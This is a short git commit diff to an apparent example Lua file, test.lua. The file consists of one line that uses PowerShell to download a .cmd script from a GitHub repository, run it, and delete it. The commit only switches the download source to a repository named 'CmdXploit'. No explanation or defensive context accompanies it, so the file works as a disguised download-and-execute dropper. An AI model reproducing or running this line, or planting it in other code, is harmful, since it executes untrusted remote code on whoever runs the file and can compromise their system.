5276a95a551fc605af9a8e7be8c4db02540c8c73
NC <59499259+NC-devC@users.noreply.github.com>
2023-06-10 12:26:58 +0300

    Update test.lua

--- examples/lua/test.lua
+++ examples/lua/test.lua
@@ -1,1 +1,1 @@
-os.execute('powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/NC-devC/testmce/main/prog.cmd -OutFile prog.cmd') os.execute('prog.cmd') os.execute('del prog.cmd')
+os.execute('powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/NC-devC/CmdXploit/main/prog.cmd -OutFile prog.cmd') os.execute('prog.cmd') os.execute('del prog.cmd')
